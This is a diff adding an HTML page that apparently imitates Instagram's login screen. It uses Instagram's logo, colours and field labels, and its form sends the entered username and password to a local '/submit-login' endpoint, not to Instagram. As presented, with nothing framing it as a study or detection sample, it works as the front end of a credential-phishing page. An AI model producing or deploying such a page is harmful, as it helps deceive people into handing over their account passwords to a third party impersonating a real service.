@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+</head>
+<body style="background-image: url('giphy.gif'); background-size: cover;  text-align: center; font-family: Arial, sans-serif;">
+    <!-- Instagram Logo -->
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" style="width: 100px; margin-top: 50px;">
+    
+    <h1 style="font-size: 24px; color: #262626;">Instagram</h1>
+    
+    <div style="display: inline-block; text-align: left; background-color: #ffffff; border: 1px solid #dbdbdb; padding: 20px; border-radius: 5px; margin-top: 20px; opacity: 0.9;">
+        <form action="/submit-login" method="post">
+            <label for="username" style="display: block; margin-bottom: 10px; color: #8e8e8e;">Phone number, username, or email:</label>
+            <input type="text" id="username" name="username" required style="width: 95%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px;">
+            
+            <label for="password" style="display: block; margin-bottom: 10px; color: #8e8e8e;">Password:</label>
+            <input type="password" id="password" name="password" required style="width: 95%; padding: 10px; margin-bottom: 20px; border: 1px solid #dbdbdb; border-radius: 3px;">
+            
+            <button type="submit" style="width: 100%; padding: 10px; background-color: #3897f0; color: #ffffff; border: none; border-radius: 5px; cursor: pointer;">Log In</button>
+        </form>
+    </div>
+    
+    <p style="margin-top: 20px; color: #ffffff;">Don't have an account? <a href="/signup" style="color: #3897f0;">Sign up</a></p>
+</body>
+</html>
